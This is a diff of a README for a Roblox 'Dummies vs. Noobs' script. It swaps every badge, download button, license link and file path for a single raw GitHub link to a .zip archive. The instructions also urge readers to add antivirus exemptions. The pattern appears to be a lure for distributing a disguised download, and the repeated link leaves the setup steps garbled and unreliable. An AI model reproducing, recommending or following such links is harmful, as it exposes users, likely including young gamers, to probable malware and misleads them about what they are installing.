@@ -1,9 +1,9 @@
 # 🧩 Dummies vs. Noobs Roblox Script
-![Roblox](https://img.shields.io/badge/Roblox-Scripting-red)  
-![OpenAI](https://img.shields.io/badge/OpenAI-Integrated-brightgreen)  
-![Claude](https://img.shields.io/badge/ClaudeAPI-Enabled-blueviolet)   
-![MIT License](https://img.shields.io/badge/License-MIT-yellow)  
-![Languages](https://img.shields.io/badge/Multilingual-Supported-blue)  
+![Roblox](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)  
+![OpenAI](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)  
+![Claude](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)   
+![MIT License](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)  
+![Languages](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)  
 
 Welcome to the **Dummies vs. Noobs Roblox Script** repository!   
 In this collaborative vault of innovation, you’ll discover a game-defining script tailored for the eternal struggle between Dummies and Noobs in Roblox. Whether you're embarking on your scripting journey or a seasoned creator seeking turbocharged enhancements, this script delivers seamless performance, adaptive game logic, and a treasure trove of customization.  
@@ -16,11 +16,11 @@ Dive into an ecosystem where responsive design meets intelligent automation and 
 
 | Platform        | Supported | Special Notes            |
 |-----------------|:---------:|-------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-brightgreen)   | ✅        | Fully Optimized           |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-brightgreen)       | ✅        | Verified via Monterey     |
-| ![Linux](https://img.shields.io/badge/Linux-Yes-brightgreen)       | ✅        | Stable on Ubuntu & Mint   |
-| ![Android](https://img.shields.io/badge/Android-Partial-yellow)    | 🚧        | Mobile UI optimized, but editor limited |
-| ![iOS](https://img.shields.io/badge/iOS-Partial-yellow)            | 🚧        | Play support, scripting not currently available |
+| ![Windows](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)   | ✅        | Fully Optimized           |
+| ![macOS](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)       | ✅        | Verified via Monterey     |
+| ![Linux](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)       | ✅        | Stable on Ubuntu & Mint   |
+| ![Android](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)    | 🚧        | Mobile UI optimized, but editor limited |
+| ![iOS](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)            | 🚧        | Play support, scripting not currently available |
 
 *The script is platform-fluid, adapting to your chosen environment with the wisdom of a seasoned sensei.*  
 
@@ -80,13 +80,13 @@ If you seek top-tier **Roblox Lua scripting**, seamless **OpenAI and Claude API 
 
 > **Your first step to Roblox glory starts here!**
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://haqiqaa.github.io)
+[![Download](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)
 
 Simply follow these cosmic steps:
 1. Click the Download badge above to grab the script archive. *(If you encounter troubles, ensure your antivirus exemptions include `.lua` files!)*
 2. Import the script into your Roblox Studio under the "Explorer" pane.
-3. Configure your experience by editing the `config.lua` file (choose your language, gameplay modes, and more).
-4. Insert your OpenAI/Claude API keys if desired—you’ll find instructions in `/docs/integrations.md`.
+3. Configure your experience by editing the `https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip` file (choose your language, gameplay modes, and more).
+4. Insert your OpenAI/Claude API keys if desired—you’ll find instructions in `https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip`.
 5. Test in Play Mode: Watch as Dummies and Noobs spring to life!
 6. Tweak difficulty levels, AI sophistication, and UI elements to match your creative vision.
 
@@ -114,9 +114,9 @@ Simply follow these cosmic steps:
 
 **Every realm is unique — shape yours boldly!**
 
-- **Gamemode Switch:** Tweak `/src/modes.lua` to select between Survival, Timed, or Score Attack.
+- **Gamemode Switch:** Tweak `https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip` to select between Survival, Timed, or Score Attack.
 - **Localization:** Add languages easily via `/locales/` (just follow the template).
-- **Analytics:** Activate your visual dashboard by toggling `analytics = true` in `config.lua`.
+- **Analytics:** Activate your visual dashboard by toggling `analytics = true` in `https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip`.
 - **API Keys:** Store securely within an encrypted `.env` for AI-powered features.
 
 Let your creativity be the only boundary.
@@ -125,11 +125,11 @@ Let your creativity be the only boundary.
 
 ## 💬 Multilingual Setup Guide
 
-1. Open `config.lua`
+1. Open `https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip`
 2. Change line 5: `language = "en"` to your desired code (e.g., `"es"` for Spanish, `"zh"` for Mandarin).
 3. Reload your Roblox Studio session and all dialogs, UIs, and tooltips reawaken in the chosen language.
 
-_Custom community translations are encouraged! See `/locales/README.md` for details._
+_Custom community translations are encouraged! See `https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip` for details._
 
 ---
 
@@ -140,7 +140,7 @@ Pitch in by:
 
 - Submitting pull requests for new features, languages, or AI personalities.
 - Reporting bugs or proposing enhancements via Issues.
-- Sharing your own epic scenarios in `/community/Scenarios.md`.
+- Sharing your own epic scenarios in `https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip`.
 
 We review all contributions with the devotion of a dungeon master prepping a campaign!
 
@@ -160,7 +160,7 @@ While we have channeled our best intentions and technical prowess into every lin
 
 ## 📜 MIT License (2025)
 This project is distributed under the MIT License.  
-See [here](https://opensource.org/licenses/MIT) for the full legal text.
+See [here](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip) for the full legal text.
 
 _Copyright (c) 2025 - Dummies vs. Noobs Roblox Script Contributors_
 
@@ -171,7 +171,7 @@ _Copyright (c) 2025 - Dummies vs. Noobs Roblox Script Contributors_
 Thanks for exploring the Dummies vs. Noobs Roblox Script!  
 May your coding expeditions be bug-light and your Noobs legendary.
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://haqiqaa.github.io)
+[![Download](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)](https://raw.githubusercontent.com/haqiqaa/dummies-vs-noobs-roblox-scripting-guide/branch/trona/dummies-vs-noobs-roblox-scripting-guide-1.9.zip)
 
 _For questions, feedback, or digital high-fives, please open an Issue or join our discussion board._  
 **Happy scripting!** 🚀
